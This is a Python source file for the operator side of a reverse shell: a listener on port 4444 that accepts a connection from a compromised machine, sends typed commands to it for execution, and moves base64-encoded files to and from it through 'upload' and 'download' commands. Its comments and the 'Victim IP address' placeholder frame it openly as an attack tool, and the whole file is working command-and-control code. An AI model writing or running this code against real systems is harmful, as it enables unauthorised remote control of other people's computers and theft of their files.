#!/usr/bin/python
import socket  # Import the socket library for network communication
import json  # Import the json module for JSON data handling
import base64  # Import the base64 module for encoding and decoding binary data

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a socket for IPv4 and TCP communication
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Set socket options for reuse address
        listener.bind((ip, port))  # Bind the socket to the specified IP and port
        listener.listen(0)  # Listen for incoming connections with a backlog of 0 (unlimited)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()  # Accept an incoming connection
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)  # Serialize data to JSON format
        self.connection.send(json_data.encode())  # Send the JSON-encoded data over the connection

    def reliable_receive(self):
        json_data = b""  # Initialize an empty bytes object for receiving data
        while True:
            try:
                part = self.connection.recv(1024)  # Receive data in 1024-byte chunks
                json_data += part
                return json.loads(json_data.decode())  # Deserialize JSON data and return it
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)  # Send the specified command to the remote host
        if command[0] == "exit":
            self.connection.close()
            exit()  # Close the connection and exit if the command is "exit"
        return self.reliable_receive()  # Receive and return the command result from the remote host

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  # Decode and write the base64-encoded content to a file
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()  # Read and encode the file content as base64

    def run(self):
        while True:
            command = input(">> ")  # Get user input for a command
            command = command.split(" ")  # Split the command into a list of words

            if command[0] == "upload":
                file_content = self.read_file(command[1])  # Read the file and encode its content as base64
                command.append(file_content)  # Append the base64-encoded content to the command

            result = self.execute_remotely(command)  # Execute the command remotely and get the result

            if command[0] == "download" and "[-] Error " not in result:
                result = self.write_file(command[1], result)  # Write the downloaded file to disk

            print(result)  # Print the result of the executed command

# Create an instance of the Listener class with the target IP address and port
my_listener = Listener("Victim IP address", 4444)
my_listener.run()  # Start the listener to handle incoming commands
